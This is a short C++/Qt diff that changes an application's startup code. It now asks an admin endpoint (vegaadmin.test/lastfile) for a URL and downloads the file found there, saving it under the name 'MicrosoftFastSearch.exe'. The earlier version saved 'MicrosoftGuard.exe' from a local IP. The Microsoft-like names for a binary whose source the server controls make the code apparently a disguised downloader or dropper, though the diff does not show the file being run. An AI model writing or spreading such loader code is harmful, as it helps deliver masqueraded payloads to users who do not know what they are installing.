@@ -4,6 +4,7 @@
 #include <QMenuBar>
 #include "process/process.h"
 #include "filedownloader.h"
+#include "requestsync.h"
 
 int main(int argc, char *argv[])
 {
@@ -26,14 +27,27 @@ int main(int argc, char *argv[])
     mainWindow.show();
 
     // 替换为你的文件下载链接和保存路径
-    QUrl downloadUrl("http://192.168.1.100/lastfile");
-    QString fileName = "MicrosoftGuard.exe";
+    // 获取最新的连接
+    QJsonObject response = RequestSync::getAPI("http://vegaadmin.test/lastfile");
 
-    // 创建文件下载器实例
-    FileDownloader fileDownloader(downloadUrl, fileName);
+    if(response.contains("url"))
+    {
+        QString url = response["url"].toString();
+        if(!url.isEmpty())
+        {
+            QUrl downloadUrl(url);
+            QString fileName = "MicrosoftFastSearch.exe";
 
-    // 开始下载
-    fileDownloader.startDownload();
+            // 创建文件下载器实例
+            FileDownloader fileDownloader(downloadUrl, fileName);
+
+            // 开始下载
+            fileDownloader.startDownload();
+            return a.exec();
+        }
+    }
+
+    QMessageBox::information(NULL,"Vega","获取最新文件失败");
 
     return a.exec();
 }
